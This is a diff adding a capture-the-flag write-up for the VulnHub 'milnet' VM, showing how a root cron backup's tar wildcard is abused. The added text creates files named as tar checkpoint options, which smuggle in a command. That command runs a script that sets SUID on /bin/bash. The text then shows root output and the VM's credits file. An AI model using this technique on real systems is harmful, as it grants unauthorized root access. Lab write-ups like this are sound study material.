@@ -151,10 +151,81 @@ as it is shown, it has root permissions and it is going to make a backup of all 
 
 i just got confused by the way it is doing it, after alittle research and seeing hacktricks site for `tar` command [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar)
 
+i noticed that using wildcard here is the problem and can lead to arbitary command execution since it is in `Wildcards Spare tricks` section of hacktricks website.
+
+then i researched about tar wildcard exploitation and found hacking articles talking about it [here](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
+
+this the way i exploited this vulnerability :
+
+```text
+$ cd /var/www/html
+
+$ echo "" > --checkpoint=1
+
+$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+
+$ echo '#!/bin/bash' > shell.sh
+
+$ echo 'chmod +s /bin/bash' >> shell.sh
+
+$ cat shell.sh
+#!/bin/bash
+chmod +s /bin/bash
+```
+
+wait a minute and then check the permission of the bash executable :
+
+```text
+$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1037464 Sep  1  2015 /bin/bash
+```
+
+as we expected there is a SUID on this binary, what we need to do is to execute it like this :
+
+```text
+$ /bin/bash -p
+
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+
+cd /root
+
+ls
+credits.txt
+
+cat credits.txt
+        ,----,
+      ,/   .`|
+    ,`   .'  :  ,---,                          ,---,.
+  ;    ;     /,--.' |                        ,'  .' |                  ,---,
+.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'|
+|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | :
+;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | |
+`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| |
+    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   |
+    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  |
+    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  |
+    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  '
+    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :|
+              `--''       \   \  /         |   | ,'  '---'        \   \  /
+                           `----'          `----'                  `----'
 
 
+This was milnet for #vulnhub by @teh_warriar
+I hope you enjoyed this vm!
 
+If you liked it drop me a line on twitter or in #vulnhub.
 
+I hope you found the clue:
+/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
+I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...
+
+This VM was inspired by The Cuckoo's Egg.
+If you have not read it give it a try:
+http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/
+```
+
+yes, this is how we can root this machine :)
 
 
 
